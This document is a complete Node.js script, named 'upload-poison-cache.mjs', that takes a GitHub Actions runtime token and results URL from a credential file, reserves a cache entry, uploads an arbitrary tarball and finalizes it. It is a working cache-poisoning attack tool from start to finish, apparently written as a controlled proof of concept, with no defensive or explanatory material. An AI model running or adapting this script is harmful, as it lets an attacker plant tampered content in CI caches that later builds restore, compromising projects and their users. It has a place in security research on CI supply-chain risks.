import {readFile} from 'node:fs/promises';

const [credentialPath, key, version, tarballPath] = process.argv.slice(2);
if (!credentialPath || !key || !version || !tarballPath) {
  throw new Error(
    'usage: node upload-poison-cache.mjs <credential.json> <key> <version> <cache.tgz>',
  );
}

const credential = JSON.parse(await readFile(credentialPath, 'utf8'));
const baseUrl = credential.caching.github.ACTIONS_RESULTS_URL;
const token = credential.caching.github.ACTIONS_RUNTIME_TOKEN;
if (!baseUrl || !token) {
  throw new Error('controlled credential is missing the results URL or token');
}

const cacheService = path =>
  new URL(`twirp/github.actions.results.api.v1.CacheService/${path}`, baseUrl);
const authenticatedPost = async (path, body) => {
  const response = await fetch(cacheService(path), {
    method: 'POST',
    headers: {
      authorization: `Bearer ${token}`,
      'content-type': 'application/json',
    },
    body: JSON.stringify(body),
  });
  const text = await response.text();
  if (!response.ok) {
    throw new Error(`${path} returned HTTP ${response.status}: ${text}`);
  }
  return text ? JSON.parse(text) : {};
};

const archive = await readFile(tarballPath);
const reservation = await authenticatedPost('CreateCacheEntry', {key, version});
const uploadUrl = new URL(reservation.signed_upload_url);
const blockId = Buffer.from('0000').toString('base64');
uploadUrl.searchParams.set('comp', 'block');
uploadUrl.searchParams.set('blockid', blockId);

let response = await fetch(uploadUrl, {
  method: 'PUT',
  headers: {
    'content-type': 'application/octet-stream',
    'x-ms-blob-type': 'BlockBlob',
  },
  body: archive,
});
if (!response.ok) {
  throw new Error(`cache block upload returned HTTP ${response.status}`);
}

const blockListUrl = new URL(reservation.signed_upload_url);
blockListUrl.searchParams.set('comp', 'blocklist');
response = await fetch(blockListUrl, {
  method: 'PUT',
  headers: {'content-type': 'text/plain; charset=UTF-8'},
  body: `<?xml version="1.0" encoding="utf-8"?>\n<BlockList>\n  <Uncommitted>${blockId}</Uncommitted>\n</BlockList>\n`,
});
if (!response.ok) {
  throw new Error(`cache block-list commit returned HTTP ${response.status}`);
}

await authenticatedPost('FinalizeCacheEntryUpload', {
  key,
  version,
  sizeBytes: archive.length,
});
console.log(`CONTROLLED_CACHE_UPLOAD_OK bytes=${archive.length}`);
